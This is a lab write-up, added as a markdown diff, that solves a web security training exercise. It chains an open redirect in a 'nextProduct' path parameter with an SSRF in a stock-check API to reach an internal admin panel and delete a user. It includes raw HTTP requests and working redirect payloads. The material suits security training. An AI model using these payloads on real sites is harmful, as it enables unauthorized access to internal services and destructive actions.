@@ -1,0 +1,90 @@
+# SSRF with filter bypass via open redirection vulnerability
+
+## Lab Description :
+![Cap dashboard screenshot](ssrf-level-5-1.png)
+
+## Overview:
+If the API used to make the back-end HTTP request supports redirections, you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target.
+
+Suppose the application contains an open redirection vulnerability in which the following URL:
+
+``/product/nextProduct?currentProductId=6&path=http://evil-user.net``
+
+returns a redirection to:
+
+``http://evil-user.net``
+
+You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:
+```html
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+```
+The application then requests the supplied URL, which triggers the open redirection. It follows the redirection, and makes a request to the internal URL of the attacker's choosing.
+
+## Solution :
+Finding a openredirect vuln -
+In this lab, below the check-stock feature we have 2 new options which is Return to list & Next product. It is a good indication that there might be a redirection happening to some other page.
+
+Clicking on Next product , our browser sends a GET request as below
+```html
+GET /product/nextProduct?currentProductId=1&path=/product?productId=2 HTTP/2
+Host: 0ada005b04660d8a820bf38e00030012.web-security-academy.net
+Cookie: session=tCPCfXrz8JKmh5Pm8VORG7tKUvRB3Zbn; session=IQ2nI1FTVgV2PFdQP0KQmVYXogYiya4h
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0ada005b04660d8a820bf38e00030012.web-security-academy.net/product?productId=1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+```
+
+We can see that there is a path= parameter which redirects to /product page.
+
+Let's try to test if there is openredirect vulnerability in this path parameter by trying to access the backend server at http://192.168.0.12:8080.
+
+![Cap dashboard screenshot](ssrf-level-5-2.png)
+
+We get a 302 redirect which confirms the openredirect vulnearbility.
+
+Access the ``/admin`` panel of backend server
+When we click check stock feature, a GET request is sent to /product/stock with a stockAPI parameter (stockApi=/product/stock/check?productId=2&storeId=1) in the body of the request.
+```html
+POST /product/stock HTTP/2
+Host: 0ada005b04660d8a820bf38e00030012.web-security-academy.net
+Cookie: session=tCPCfXrz8JKmh5Pm8VORG7tKUvRB3Zbn; session=IQ2nI1FTVgV2PFdQP0KQmVYXogYiya4h
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0ada005b04660d8a820bf38e00030012.web-security-academy.net/product?productId=2
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Origin: https://0ada005b04660d8a820bf38e00030012.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+
+stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
+```
+Now provide the redirect path ``/product/nextProduct?path=http://192.168.0.12:8080/admin`` to the stockApi parameter(remove the currentProductId=1 from the full uri ``/product/nextProduct?currentProductId=1&path=/product?productId=2``
+
+We get a 200 OK response & we can able to access the admin panel.
+
+![Cap dashboard screenshot](ssrf-level-5-3.png)
+
+Lets delete the user carlos to solve the lab - ``/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos,``
+
+![Cap dashboard screenshot](ssrf-level-5-4.png)
+
+![Cap dashboard screenshot](ssrf-level-5-5.png)
+
+#### Visit The Next Page For The Next Level :)
